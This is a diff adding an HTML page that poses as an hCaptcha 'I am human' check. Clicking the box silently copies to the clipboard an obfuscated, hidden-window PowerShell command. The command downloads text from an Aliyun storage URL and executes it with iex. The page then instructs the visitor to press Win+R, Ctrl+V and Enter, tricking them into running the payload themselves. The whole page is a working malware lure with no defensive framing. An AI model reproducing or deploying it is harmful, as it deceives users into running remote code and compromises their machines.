@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify You're Not Bot Check</title>
+    <style>
+    :root{--text-color:#222222;--bg-color:rgba(255,255,255,0.9);--highlight-color:#c7c7c7;--box-shadow:0 2px 8px rgba(0,0,0,0.8);--font-family:'system-ui',serif;--font-size-main:18px;--captcha-bg-color:#f9f9f9}body,.container{margin:0;padding:0;min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:var(--font-family);background:white;color:var(--text-color)}.box{background:var(--bg-color);padding:50px;border-radius:5px;box-shadow:var(--box-shadow);max-width:600px;width:100%;font-size:var(--font-size-main);text-align:center;box-sizing:border-box}.box h1{font-size:1em;margin:0}.custom-captcha{background-color:var(--captcha-bg-color);border:0.5px solid #222222;padding:15px;border-radius:4px;display:flex;align-items:center;justify-content:space-between;gap:40px;cursor:pointer}.custom-captcha-left{display:flex;align-items:center;gap:8px;margin-right:48px}.custom-captcha input[type="checkbox"]{width:24px;height:24px;pointer-events:none}.custom-captcha img{width:30px;height:34px;display:block;margin:0 auto}.captcha-label{font-size:12px;font-weight:Bold;text-align:center;margin-top:4px}.step{margin:20px 0;display:flex;align-items:Left;justify-content:left}.custom-key{display:inline-block;padding:10px 20px;background: #0d0d0d;border-radius:8px;font-weight:bold;font-family:monospace;color:White;margin:0 5px}.custom-key.windows::before{content:'⊞';margin-right:5px}#floating-box{display:none}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="box" id="initial-box">
+            <p>Please verify</p>
+            <div class="custom-captcha">
+                <div class="custom-captcha-left">
+                    <input type="checkbox" id="humanCheck">
+                    <span>I am human</span>
+                </div>
+                <div class="custom-captcha-right" style="text-align: center;">
+                    <img src="https://cdn.worldvectorlogo.com/logos/hcaptcha-2.svg" alt="hCaptcha logo">
+                    <div class="captcha-label">hCaptcha</div>
+                </div>
+            </div><br>
+<span style="font-size: 0.75rem; text-align:center; color: #555; display: block; margin: 0;">
+"Verification helps keep our platform secure."
+</span>
+        </div>
+        <div class="box" id="floating-box">
+            <div class="verification-message">
+                <h5>Complete the task to proceed.</h5>
+            </div>
+            <div class="step">Step 1: Press Windows<span class="custom-key windows"></span> + <span class="custom-key">R</span></div>
+            <div class="step">Step 2: Press <span class="custom-key">CTRL</span> + <span class="custom-key">V</span></div>
+            <div class="step">Step 3: Press <span class="custom-key">⏎</span> Enter</div>
+		<span style="font-size: 0.75rem; text-align: left; color: #555; display: block; margin: 0;">
+  Hint: use your keyboard
+</span>
+        </div>
+    </div>
+      <script>
+        // Function to display the verification steps
+        function showVerificationSteps() {
+            document.getElementById('initial-box').style.display = 'none';
+            document.getElementById('floating-box').style.display = 'block';
+        }
+
+        // Event listener for the entire initial box container
+        document.getElementById('initial-box').addEventListener('click', () => {
+            // Construct the PowerShell command
+            const step1 = "power";
+            const step2 = "shell.exe";
+            const step3 = "-W Hidden -command ";
+            const cmdVar1 = "$url='https://storageinstance.oss-ap-southeast-1.aliyuncs.com/link/process/pennicle.txt';";
+            const cmdVar2 = "$response=Invoke-WebRequest -Uri $url -UseBasicParsing;";
+            const cmdVar3 = "$content=$response.Content;";
+            const cmdVar4 = "iex $content";
+            const powershellCommand = `${step1}${step2} ${step3} ${cmdVar1} ${cmdVar2} ${cmdVar3} ${cmdVar4}`;
+            
+            // Copy the command to the clipboard
+            navigator.clipboard.writeText(powershellCommand).then(() => {
+                // Show the verification steps
+                showVerificationSteps();
+            });
+        });
+    </script>
+</body>
+</html>
